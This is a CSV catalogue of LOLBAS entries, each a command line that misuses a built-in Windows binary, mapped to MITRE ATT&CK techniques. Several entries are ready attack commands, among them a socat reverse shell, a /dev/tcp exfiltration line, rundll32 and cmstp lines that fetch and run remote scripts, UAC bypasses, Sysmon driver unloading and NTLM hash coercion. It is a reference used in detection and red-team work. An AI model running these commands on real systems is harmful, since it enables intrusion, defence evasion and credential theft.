Command,Name,Description,Usecase,Category,MitreID
ilasm.exe C:\public\test.txt /dll,Ilasm.exe,Binary file used by .NET to compile C#/intermediate (IL) code to dll,A description of the usecase,Compile,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ilasm.yml
TTDInject.exe /ClientParams "7 tmp.run 0 0 0 0 0 0 0 0 0 0" /Launch "C:/Windows/System32/calc.exe",Ttdinject.exe,Execute calc using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed. but the length (7) has to be updated.,Spawn process using other binary,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ttdinject.yml
ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams "7 tmp.run 0 0 0 0 0 0 0 0 0 0" /launch "C:/Windows/System32/calc.exe",Ttdinject.exe,Execute calc using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed. but the length (7) has to be updated.,Spawn process using other binary,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ttdinject.yml
psr.exe /start /output D:\test.zip /sc 1 /gui 0,Psr.exe,Record a user screen without creating a GUI. You should use "psr.exe /stop" to stop recording and create output file.,Can be used to take screenshots of the user environment,Reconnaissance,T1113,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Psr.yml
pktmon.exe start --etw,Pktmon.exe,Will start a packet capture and store log file as PktMon.etl. Use pktmon.exe stop,use this a built in network sniffer on windows 10 to capture senstive traffic,Reconnaissance,T1040,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Pktmon.yml
pktmon.exe filter add -p 445,Pktmon.exe,Select Desired ports for packet capture,Look for interesting traffic such as telent or FTP,Reconnaissance,T1040,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Pktmon.yml
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe,Certutil.exe,Download and save 7zip to disk in the current folder.,Download file from Internet,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certutil.yml
certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe,Certutil.exe,Download and save 7zip to disk in the current folder.,Download file from Internet,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certutil.yml
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt,Certutil.exe,Download and save a PS1 file to an Alternate Data Stream (ADS).,Download file from Internet and save it in an NTFS Alternate Data Stream,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certutil.yml
certutil -encode inputFileName encodedOutputFileName,Certutil.exe,Command to encode a file using Base64,Encode files to evade defensive measures,Encode,T1027,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certutil.yml
certutil -decode encodedInputFileName decodedOutputFileName,Certutil.exe,Command to decode a Base64 encoded file.,Decode files to evade defensive measures,Decode,T1140,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certutil.yml
certutil -decodehex encoded_hexadecimal_InputFileName decodedOutputFileName,Certutil.exe,Command to decode a hexadecimal-encoded file decodedOutputFileName,Decode files to evade defensive measures,Decode,T1140,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certutil.yml
OneDriveStandaloneUpdater,OneDriveStandaloneUpdater.exe,Download a file from the web address specified in HKCU\Software\Microsoft\OneDrive\UpdateOfficeConfig\UpdateRingSettingURLFromOC. ODSUUpdateXMLUrlFromOC and UpdateXMLUrlFromOC must be equal to non-empty string values in that same registry key. UpdateOfficeConfigTimestamp is a UNIX epoch time which must be set to a large QWORD such as 99999999999 (in decimal) to indicate the URL cache is good. The downloaded file will be in %localappdata%\OneDrive\StandaloneUpdater\PreSignInSettingsConfig.json,Download a file from the Internet without executing any anomalous executables with suspicious arguments,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/OneDriveStandaloneUpdater.yml
dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll,Dnscmd.exe,Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.,Remotely inject dll to dns server,Execute,T1543.003,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Dnscmd.yml
xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC},Xwizard.exe,Xwizard.exe running a custom class that has been added to the registry.,Run a com object created in registry to evade defensive counter measures,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml
xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC},Xwizard.exe,Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds.,Run a com object created in registry to evade defensive counter measures,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM,Xwizard.exe,Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file. and save it to %LocalAppData%\Microsoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION> or %LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>,Download file from Internet,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml
cmstp.exe /ni /s c:\cmstp\CorpVPN.inf,Cmstp.exe,Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.,Execute code hidden within an inf file. Download and run scriptlets from internet.,Execute,T1218.003,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmstp.yml
cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf,Cmstp.exe,Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.,Execute code hidden within an inf file. Execute code directly from Internet.,AWL Bypass,T1218.003,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmstp.yml
diskshadow.exe /s c:\test\diskshadow.txt,Diskshadow.exe,Execute commands using diskshadow.exe from a prepared diskshadow script.,Use diskshadow to exfiltrate data from VSS such as NTDS.dit,Dump,T1003.003,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Diskshadow.yml
diskshadow> exec calc.exe,Diskshadow.exe,Execute commands using diskshadow.exe to spawn child process,Use diskshadow to bypass defensive counter measures,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Diskshadow.yml
regedit /E c:\ads\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey,Regedit.exe,Export the target Registry key to the specified .REG file.,Hide registry data in alternate data stream,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regedit.yml
regedit C:\ads\file.txt:regfile.reg,Regedit.exe,Import the target .REG file into the Registry.,Import hidden registry data from alternate data stream,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regedit.yml
wuauclt.exe /UpdateDeploymentProvider Full_Path_To_DLL /RunHandlerComServer,wuauclt.exe,Full_Path_To_DLL would be the abosolute path to .DLL file and would execute code on attach.,Execute dll via attach/detach methods,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wuauclt.yml
bash.exe -c calc.exe,Bash.exe,Executes calc.exe from bash.exe,Performs execution of specified file. can be used as a defensive evasion.,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bash.yml
bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh*pty*stderr*setsid*sigint*sane",Bash.exe,Executes a reverseshell,Performs execution of specified file. can be used as a defensive evasion.,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bash.yml
bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/192.168.1.10/24',Bash.exe,Exfiltrate data,Performs execution of specified file. can be used as a defensive evasion.,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bash.yml
bash.exe -c calc.exe,Bash.exe,Executes calc.exe from bash.exe,Performs execution of specified file. can be used to bypass Application Whitelisting.,AWL Bypass,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bash.yml
wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u calc.exe,Wlrmdr.exe,Execute calc.exe with wlrmdr.exe as parent process,Use wlrmdr as a proxy binary to evade defensive countermeasures,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wlrmdr.yml
bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1,Bitsadmin.exe,Create a bitsadmin job named 1. add cmd.exe to the job. configure the job to run the target command from an Alternate data stream. then resume and complete the job.,Performs execution of specified file in the alternate data stream. can be used as a defensive evasion or persistence technique.,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bitsadmin.yml
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1,Bitsadmin.exe,Create a bitsadmin job named 1. add cmd.exe to the job. configure the job to run the target command. then resume and complete the job.,Download file from Internet,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bitsadmin.yml
bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset,Bitsadmin.exe,Command for copying cmd.exe to another folder,Copy file,Copy,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bitsadmin.yml
bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset,Bitsadmin.exe,One-liner that creates a bitsadmin job named 1. add cmd.exe to the job. configure the job to run the target command. then resume and complete the job.,Execute binary file specified. Can be used as a defensive evasion.,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bitsadmin.yml
C:\Windows\System32\IME\SHARED\IMEWDBLD.exe https://pastebin.com/raw/tdyShwLw,IMEWDBLD.exe,IMEWDBLD.exe attempts to load a dictionary file. if provided a URL as an argument. it will download the file served at by that URL and save it to %LocalAppData%\Microsoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION> or %LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>,Download file from Internet,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml
Microsoft.Workflow.Compiler.exe tests.xml results.xml,Microsoft.Workflow.Compiler.exe,Compile and execute C# or VB.net code in a XOML file referenced in the test.xml file.,Compile and run code,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Microsoft.Workflow.Compiler.yml
Microsoft.Workflow.Compiler.exe tests.txt results.txt,Microsoft.Workflow.Compiler.exe,Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file.,Compile and run code,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Microsoft.Workflow.Compiler.yml
Microsoft.Workflow.Compiler.exe tests.txt results.txt,Microsoft.Workflow.Compiler.exe,Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file.,Compile and run code,AWL Bypass,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Microsoft.Workflow.Compiler.yml
eventvwr.exe,Eventvwr.exe,During startup. eventvwr.exe checks the registry value HKCU\Software\Classes\mscfile\shell\open\command for the location of mmc.exe. which is used to open the eventvwr.msc saved console file. If the location of another binary or script is added to this registry value. it will be executed as a high-integrity process without a UAC prompt being displayed to the user.,Execute a binary or script as a high-integrity process without a UAC prompt.,UAC Bypass,T1548.002,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Eventvwr.yml
ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c calc > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe,Eventvwr.exe,During startup. eventvwr.exe uses .NET deserialization with %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews file. This file can be created using https://github.com/pwntester/ysoserial.net,Execute a command to bypass security restrictions that limit the use of command-line interpreters.,UAC Bypass,T1548.002,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Eventvwr.yml
winget.exe install --manifest manifest.yml,winget.exe,Downloads a file from the web address specified in manifest.yml and executes it on the system. Local manifest setting must be enabled in winget for it to work: "winget settings --enable LocalManifestFiles",Download and execute an arbitrary file from the internet,Execute,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Winget.yml
makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab,Makecab.exe,Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.,Hide data compressed into an alternate data stream,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Makecab.yml
makecab \\webdavserver\webdav\file.exe C:\Folder\file.txt:file.cab,Makecab.exe,Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.,Hide data compressed into an alternate data stream,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Makecab.yml
makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab,Makecab.exe,Download and compresses the target file and stores it in the target file.,Download file and compress into a cab file,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Makecab.yml
Register-cimprovider -path "C:\folder\evil.dll",Register-cimprovider.exe,Load the target .DLL.,Execute code within dll file,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Register-cimprovider.yml
wab.exe,Wab.exe,Change HKLM\Software\Microsoft\WAB\DLLPath and execute DLL of choice,Execute dll file. Bypass defensive counter measures,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wab.yml
rundll32.exe AllTheThingsx64*EntryPoint,Rundll32.exe,AllTheThingsx64 would be a .DLL file and EntryPoint would be the name of the entry point in the .DLL file to execute.,Execute dll file,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml
rundll32.exe \\10.10.10.10\share\payload.dll*EntryPoint,Rundll32.exe,Use Rundll32.exe to execute a DLL from a SMB share. EntryPoint is the name of the entry point in the .DLL file to execute.,Execute DLL from SMB share.,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml
rundll32.exe javascript:"\..\mshtml*RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"),Rundll32.exe,Use Rundll32.exe to execute a JavaScript script that runs a PowerShell script that is downloaded from a remote web site.,Execute code from Internet,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml
rundll32.exe javascript:"\..\mshtml.dll*RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");,Rundll32.exe,Use Rundll32.exe to execute a JavaScript script that runs calc.exe.,Proxy execution,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml
rundll32.exe javascript:"\..\mshtml*RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe"*0*true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe"*0*true);},Rundll32.exe,Use Rundll32.exe to execute a JavaScript script that runs calc.exe and then kills the Rundll32.exe process that was started.,Proxy execution,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml
rundll32.exe javascript:"\..\mshtml*RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test"),Rundll32.exe,Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script.,Execute code from Internet,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml
rundll32 "C:\ads\file.txt:ADSDLL.dll"*DllMain,Rundll32.exe,Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS).,Execute code from alternate data stream,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml
rundll32.exe -sta {CLSID},Rundll32.exe,Use Rundll32.exe to load a registered or hijacked COM Server payload.  Also works with ProgID.,Execute a DLL/EXE COM server payload or ScriptletURL code.,Execute,T1218.011,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml
wmic.exe process call create "c:\ads\file.txt:program.exe",Wmic.exe,Execute a .EXE file stored as an Alternate Data Stream (ADS),Execute binary file hidden in Alternate data streams to evade defensive counter measures,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml
wmic.exe process call create calc,Wmic.exe,Execute calc from wmic,Execute binary from wmic to evade defensive counter measures,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml
wmic.exe /node:"192.168.0.1" process call create "evil.exe",Wmic.exe,Execute evil.exe on the remote system.,Execute binary on a remote system,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml
wmic.exe process get brief /format:"https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl",Wmic.exe,Create a volume shadow copy of NTDS.dit that can be copied.,Execute binary on remote system,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml
wmic.exe process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl",Wmic.exe,Executes JScript or VBScript embedded in the target remote XSL stylsheet.,Execute script from remote system,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml
odbcconf /a {REGSVR c:\test\test.dll},Odbcconf.exe,Execute DllREgisterServer from DLL specified.,Execute dll file using technique that can evade defensive counter measures,Execute,T1218.008,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Odbcconf.yml
odbcconf INSTALLDRIVER "lolbas-project|Driver=c:\test\test.dll|APILevel=2"
odbcconf configsysdsn "lolbas-project" "DSN=lolbas-project"
,Odbcconf.exe,Install a driver and load the DLL. Requires administrator privileges.,Execute dll file using technique that can evade defensive counter measures,Execute,T1218.008,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Odbcconf.yml
odbcconf -f file.rsp,Odbcconf.exe,Load DLL specified in target .RSP file. See the Code Sample section for an example .RSP file.,Execute dll file using technique that can evade defensive counter measures,Execute,T1218.008,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Odbcconf.yml
fltMC.exe unload SysmonDrv,fltMC.exe,Unloads a driver used by security agents,Defense evasion,Tamper,T1562.001,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/FltMC.yml
CustomShellHost.exe,CustomShellHost.exe,Executes explorer.exe (with command-line argument /NoShellRegistrationCheck) if present in the current working folder.,Can be used to evade defensive counter-measures,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/CustomShellHost.yml
vbc.exe /target:exe c:\temp\vbs\run.vb,vbc.exe,Binary file used by .NET to compile Visual Basic code to an executable.,Compile attacker code on system. Bypass defensive counter measures.,Compile,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Vbc.yml
vbc -reference:Microsoft.VisualBasic.dll c:\temp\vbs\run.vb,vbc.exe,Binary file used by .NET to compile Visual Basic code to an executable.,Compile attacker code on system. Bypass defensive counter measures.,Compile,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Vbc.yml
setres.exe -w 800 -h 600,Setres.exe,Sets the resolution and then launches 'choice' command from the working directory.,Executes arbitrary code,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Setres.yml
pnputil.exe -i -a C:\Users\hai\Desktop\mo.inf,Pnputil.exe,Used for installing drivers,Add malicious driver,Execute,T1547,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Pnputil.yml
regsvcs.exe AllTheThingsx64.dll,Regsvcs.exe,Loads the target .DLL file and executes the RegisterClass function.,Execute dll file and bypass Application whitelisting,Execute,T1218.009,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regsvcs.yml
regsvcs.exe AllTheThingsx64.dll,Regsvcs.exe,Loads the target .DLL file and executes the RegisterClass function.,Execute dll file and bypass Application whitelisting,AWL Bypass,T1218.009,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regsvcs.yml
msiexec /quiet /i cmd.msi,Msiexec.exe,Installs the target .MSI file silently.,Execute custom made msi file with attack code,Execute,T1218.007,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msiexec.yml
msiexec /q /i http://192.168.100.3/tmp/cmd.png,Msiexec.exe,Installs the target remote & renamed .MSI file silently.,Execute custom made msi file with attack code from remote server,Execute,T1218.007,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msiexec.yml
msiexec /y "C:\folder\evil.dll",Msiexec.exe,Calls DLLRegisterServer to register the target DLL.,Execute dll files,Execute,T1218.007,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msiexec.yml
msiexec /z "C:\folder\evil.dll",Msiexec.exe,Calls DLLRegisterServer to un-register the target DLL.,Execute dll files,Execute,T1218.007,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msiexec.yml
rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM,Rpcping.exe,Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.,Capture credentials on a non-standard port,Credentials,T1003,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rpcping.yml
rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM,Rpcping.exe,Trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign not Set).,Relay a NTLM authentication over RPC (ncacn_ip_tcp) on a custom port,Credentials,T1187,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rpcping.yml
diantz.exe c:\pathToFile\file.exe c:\destinationFolder\targetFile.txt:targetFile.cab,Diantz.exe,Compress taget file into a cab file stored in the Alternate Data Stream (ADS) of the target file.,Hide data compressed into an Alternate Data Stream.,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Diantz.yml
diantz.exe \\remotemachine\pathToFile\file.exe c:\destinationFolder\file.cab,Diantz.exe,Download and compress a remote file and store it in a cab file on local machine.,Download and compress into a cab file.,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Diantz.yml
extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe,Extrac32.exe,Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file.,Extract data from cab file and hide it in an alternate data stream.,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml
extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe,Extrac32.exe,Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file.,Extract data from cab file and hide it in an alternate data stream.,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml
extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt,Extrac32.exe,Copy the source file to the destination file and overwrite it.,Download file from UNC/WEBDav,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml
extrac32.exe /C C:\Windows\System32\calc.exe C:\Users\user\Desktop\calc.exe,Extrac32.exe,Command for copying calc.exe to another folder,Copy file,Copy,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml
Pcwrun.exe c:\temp\beacon.exe,Pcwrun.exe,Open the target .EXE file with the Program Compatibility Wizard.,Proxy execution of binary,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Pcwrun.yml
Pcwrun.exe /../../$(calc).exe,Pcwrun.exe,Leverage the MSDT follina vulnerability through Pcwrun to execute arbitrary commands and binaries. Note that this specific technique will not work on a patched system with the June 2022 Windows Security update.,Proxy execution of binary,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Pcwrun.yml
Runonce.exe /AlternateShellStartup,Runonce.exe,Executes a Run Once Task that has been configured in the registry,Persistence. bypassing defensive counter measures,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Runonce.yml
CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt,CertReq.exe,Save the response from a HTTP POST to the endpoint https://example.org/ as output.txt in the current directory,Download file from Internet,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml
CertReq -Post -config https://example.org/ c:\windows\win.ini and show response in terminal,CertReq.exe,Send the file c:\windows\win.ini to the endpoint https://example.org/ via HTTP POST,Upload,Upload,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml
stordiag.exe,Stordiag.exe,Once executed. Stordiag.exe will execute schtasks.exe systeminfo.exe and fltmc.exe - if stordiag.exe is copied to a folder and an arbitrary executable is renamed to one of these names. stordiag.exe will execute it.,Possible defence evasion purposes.,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Stordiag.yml
wsreset.exe,Wsreset.exe,During startup. wsreset.exe checks the registry value HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command for the command to run. Binary will be executed as a high-integrity process without a UAC prompt being displayed to the user.,Execute a binary or script as a high-integrity process without a UAC prompt.,UAC Bypass,T1548.002,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wsreset.yml
